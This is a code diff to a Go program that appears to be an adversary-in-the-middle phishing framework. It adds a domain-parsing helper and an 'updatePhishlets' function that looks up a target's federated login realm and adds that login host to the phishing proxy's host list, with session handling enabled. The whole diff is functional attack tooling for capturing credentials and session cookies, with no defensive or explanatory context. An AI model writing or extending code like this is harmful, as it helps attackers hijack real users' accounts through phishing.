@@ -6,6 +6,7 @@ import (
 	"fmt"
 	"io/fs"
 	"io/ioutil"
+	"net/url"
 	"os"
 	"regexp"
 	"strconv"
@@ -228,4 +229,64 @@ func isValidEmail(email string) bool {
 	}
 
 	return true
+}
+
+func extractDomainInfo(rawURL string) (subdomain, domain string, err error) {
+	// Parse the URL
+	parsedURL, err := url.Parse(rawURL)
+	if err != nil {
+		return "", "", err
+	}
+
+	// Get the hostname
+	host := parsedURL.Hostname()
+	if host == "" {
+		return "", "", fmt.Errorf("no hostname found in URL")
+	}
+
+	// Split the hostname into parts
+	parts := strings.Split(host, ".")
+
+	// Handle cases with different numbers of parts
+	switch len(parts) {
+	case 0, 1:
+		return "", "", fmt.Errorf("invalid hostname format")
+	case 2:
+		// No subdomain (e.g., example.com)
+		return "", parts[0] + "." + parts[1], nil
+	default:
+		// Has subdomain (e.g., sub.example.com)
+		// Join all parts except the last two for subdomain
+		subdomain := strings.Join(parts[:len(parts)-2], ".")
+		// Last two parts form the domain
+		domain := parts[len(parts)-2] + "." + parts[len(parts)-1]
+		return subdomain, domain, nil
+	}
+}
+
+func updatePhishlets(url string, pl *Phishlet) {
+	mailInfo, mailErr := fetchUserRealm(url)
+	if mailErr == nil {
+		subDomain, domain, domainErr := extractDomainInfo(mailInfo.FederationActiveAuthURL)
+		if domainErr == nil {
+			found := false
+			for _, ph := range pl.proxyHosts {
+				if ph.domain == domain && ph.phish_subdomain == subDomain {
+					found = true
+					break
+				}
+			}
+
+			if !found {
+				pl.proxyHosts = append(pl.proxyHosts, ProxyHost{
+					phish_subdomain: subDomain,
+					orig_subdomain:  subDomain,
+					domain:          domain,
+					handle_session:  true,
+					is_landing:      false,
+				})
+				pl.cfg.refreshActiveHostnames()
+			}
+		}
+	}
 }
